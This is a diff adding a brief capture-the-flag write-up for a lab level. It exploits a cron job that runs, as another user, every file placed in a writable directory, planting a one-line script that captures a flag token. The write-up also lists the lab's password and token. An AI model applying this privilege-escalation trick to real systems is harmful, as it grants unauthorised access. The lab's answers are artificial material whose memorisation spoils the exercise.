@@ -1,0 +1,34 @@
+ne2searoevaevoem4ov4ar8ap
+
+As we connect, we got a mail.
+
+Mail are stored at /var/mail/$USER and /var/spool/mail/$USER
+
+<- cat /var/spool/mail/$USER
+-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+We got a crontab that execute every 2 minutes as flag05 the script in /usr/sbin/openarenaserver.
+Let's check that file:
+
+<- cat /usr/sbin/openarenaserver
+-> #!/bin/sh
+-> 
+-> for i in /opt/openarenaserver/* ; do
+->         (ulimit -t 5; bash -x "$i")
+->         rm -f "$i"
+-> done
+
+This script execute each executable files in /opt/openarenaserver/ whom won't exceed 5 secound and delete it after that.
+
+So we'll just write a file that call getflag:
+
+<- echo 'getflag > /tmp/popipo' > /opt/openarenaserver/popipo
+
+And that all. Now we wait more or less 2 minutes.
+
+...
+One eternity later
+...
+
+<- cat /tmp/popipo
+-> Check flag.Here is your token : viuaaale9huek52boumoomioc
